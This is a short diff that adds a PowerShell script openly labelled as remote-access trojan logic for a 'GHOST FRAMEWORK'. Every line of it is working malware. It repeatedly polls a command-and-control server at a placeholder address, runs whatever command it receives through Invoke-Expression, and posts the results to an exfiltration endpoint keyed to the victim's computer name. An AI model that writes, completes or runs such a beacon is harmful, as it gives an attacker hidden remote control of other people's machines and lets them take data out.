@@ -1,0 +1,21 @@
+# GHOST FRAMEWORK - Remote Access Trojan Logic
+$C2 = "https://<YOUR-C2-IP>:5000"
+
+while ($true) {
+    try {
+        # CHECK FOR COMMANDS
+        $command = Invoke-RestMethod -Uri "$C2/command/$env:COMPUTERNAME" -Method GET
+        
+        if ($command) {
+            # EXECUTE THE COMMAND
+            $output = Invoke-Expression $command 2>&1
+            
+            # EXFILTRATE THE RESULTS
+            $body = @{result = $output}
+            Invoke-RestMethod -Uri "$C2/exfil/$env:COMPUTERNAME" -Method POST -Body $body
+        }
+    } catch {
+        Write-Host "[-] C2 Connection failed, retrying..."
+    }
+    Start-Sleep -Seconds 5
+}
